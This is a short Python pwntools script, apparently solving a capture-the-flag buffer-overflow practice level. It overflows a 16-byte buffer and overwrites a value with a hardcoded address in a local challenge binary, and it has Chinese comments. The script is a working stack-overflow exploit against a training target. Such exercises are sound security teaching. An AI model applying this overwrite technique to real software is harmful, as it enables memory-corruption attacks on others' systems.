#!/usr/bin/python3

import pwn

data = 0x4012D7

proc = pwn.process("/challenge/buffer-overflow-level1.1")
payload = b'a' * 0x10   # 写满缓冲区
payload += b'b' * 0x8
payload += pwn.p64(data)   # 覆盖变量
print(payload)
proc.sendline(payload)

result = proc.recvall().decode()
for line in result.split('\n'):
    print(line)